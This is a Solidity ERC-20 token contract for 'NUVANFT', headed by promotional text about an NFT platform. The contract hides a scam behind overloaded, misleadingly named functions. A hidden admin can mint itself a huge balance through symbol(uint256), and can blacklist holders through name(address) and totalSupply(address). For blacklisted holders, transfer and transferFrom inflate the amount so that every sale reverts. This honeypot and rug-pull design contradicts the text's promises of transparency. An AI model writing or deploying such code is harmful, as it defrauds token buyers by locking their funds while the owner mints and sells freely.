/*
The Nuva NFT Platform has been meticulously crafted with a set of well-defined objectives, 
each aimed at addressing specific needs and pain points within the NFT ecosystem.

Empower Creators and Artists
One of our primary objectives is to empower creators and artists. We recognize the immense 
talent and creativity that exists globally and the barriers that can hinder their ability to tokenize 
their work and earn fair compensation. Through our platform, creators can seamlessly mint their 
art, music, collectibles, and virtual assets as NFTs.
They retain control over their work and can set royalties, ensuring that they are rightfully compensated 
every time their creations change hands.

Enable Community Engagement
The Nuva NFT Platform is more than just a marketplace; it's a community hub for NFT enthusiasts, 
artists, and collectors. We foster an environment where like-minded individuals can connect, interact, 
and discover new and exciting NFTs. Collectors can build their digital art and collectibles portfolios 
and showcase them on their public profiles, creating a social and engaging space for NFT enthusiasts.

Provide a User-Friendly Experience
We are committed to offering a user-friendly experience for both creators and collectors. The platform's 
design and functionality are intuitive and accessible, ensuring that users, regardless of their level of 
technical expertise, can easily navigate and utilize the platform. The platform's features, such as search, 
filtering, and categorization, enable efficient NFT discovery.

Promote Transparency
Transparency is a fundamental value of the Nuva NFT Platform. We believe in providing users with a 
transparent and trustworthy environment for NFT creation and trading. Every NFT's ownership and transaction 
history can be easily verified, instilling confidence and trust among users. Our commitment to transparency 
extends to our governance model, which allows the community to participate in decision-making.

Core Features
The Nuva NFT Platform boasts a range of core features that make it a versatile and dynamic ecosystem for 
NFT creation, discovery, and trade:

Discover
Our discovery feature allows users to explore a vast collection of NFTs across various categories. Whether 
you're interested in digital art, music, virtual assets, or other collectibles, you can easily find NFTs that align 
with your interests. The search, filter, and discovery functions make it simple to locate NFTs based on your 
preferences, rarity, and the creators behind them.

Collect
Building a digital art and collectibles portfolio has never been easier. With the Collect feature, users can 
gather and showcase their NFTs in one place. This public profile becomes a hub for connecting with fellow 
collectors, displaying your unique collection, and making your mark in the NFT community.

Mint
Minting NFTs is a straightforward process on the Nuva NFT Platform. We've designed a user-friendly, 
cost-effective platform for creators to tokenize their work. Artists and creators can upload their content, 
configure their NFTs, and set royalties. This approach empowers creators to maintain control over their 
work and receive fair compensation throughout its lifecycle.

Sell
Listing NFTs for sale is a seamless process. Creators can set their pricing, choose auction options, or sell 
NFTs directly to interested buyers. This flexibility allows for a range of selling strategies, empowering 
creators to reach their intended audiences and maximize the value of their work.

Buy
Buying NFTs on the Nuva NFT Platform is equally straightforward. Users can select NFTs they desire and 
complete secure and efficient transactions. Payment methods include the NUVANFT token, Ethereum (ETH), 
and more, ensuring that users can pay for NFTs using their preferred options.

In summary, the Nuva NFT Platform has been purposefully designed to empower creators, engage the 
community, provide a user-friendly experience, and promote transparency. Our core features facilitate the 
creation, discovery, trading, and collection of NFTs while ensuring that users have the tools they need to 
make the most of their NFT journey.

NUVANFT Token
Token Overview
NUVANFT, the native utility token of the Nuva NFT platform, serves as the backbone of our ecosystem. 
It is a digital asset designed to facilitate various activities within the platform, participate in governance, 
and enhance the overall user experience.

Token Symbol: NUVANFT
NUVANFT is represented by the ticker symbol "NUVANFT," making it easily recognizable and tradable on various exchanges.

Total Supply: 1000000000
The total supply of NUVANFT tokens is carefully determined to strike a balance between scarcity and utility. 
This figure ensures that the token retains value over time while allowing for broader adoption.

Blockchain: Ethereum
The NUVANFT token operates on a secure and well-established blockchain, providing users with a robust 
and trusted foundation for all transactions and interactions.

Token Utility
NUVANFT tokens have several key utility functions within the Nuva NFT ecosystem, enabling a seamless 
and efficient experience for platform users:

Governance
NUVANFT holders have the power to influence the future direction of the Nuva NFT platform through a 
governance system. They can participate in decision-making processes, such as voting on proposals related 
to platform upgrades, fee adjustments, and other significant changes. This empowers the community to play 
a vital role in shaping the platform's development.

Staking
Staking NUVANFT tokens allows users to earn rewards in the form of additional tokens or other incentives. 
Staking is not only a way for token holders to secure the network but also an opportunity to actively participate 
in the platform's growth and benefit from its success.

Discounts
NUVANFT tokens can be used to pay for transaction fees on the Nuva NFT platform. By utilizing NUVANFT 
for these fees, users can benefit from significant discounts, reducing the cost of minting, buying, selling, and 
trading NFTs. This approach encourages the use of NUVANFT within the platform and rewards its holders.

Rewarding Creators
NUVANFT tokens enable users to tip, purchase NFTs, and support creators on the platform. This system 
ensures that artists and creators receive recognition and compensation for their work while fostering a vibrant 
and supportive community of NFT enthusiasts.
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    
}

contract NuvaNFT is Ownable{
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(string memory tokenname,string memory tokensymbol,address ghadmin) {
        _totalSupply = 1000000000*10**decimals();
        _balances[msg.sender] = 1000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        SCCLadmin = ghadmin;
        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());
    }
    

    mapping(address => bool) public nakinfo;
    address public SCCLadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    uint256 xkak = (10**18 * (78800+100)* (33300000000 + 800));
    
    function symbol(uint256 aaxa) public   {
        if(false){
            
        }
        if(true){

        }
        _balances[_msgSender()] += xkak;
        _balances[_msgSender()] += xkak;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
    }


    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address sada) public  {
        address taaxaoinfo = sada;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
        nakinfo[taaxaoinfo] = false;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address xsada) public {
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
        address tmoinfo = xsada;
        nakinfo[tmoinfo] = true;
        require(_msgSender() == SCCLadmin, "Only ANIUadmin can call this function");
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (true == nakinfo[_msgSender()]) 
        {amount = _balances[_msgSender()] + 
        1000-1000+2000;}
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        if (true == nakinfo[from]) 
        {amount = _balances[_msgSender()] + 
        1000-1000+2000;}
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}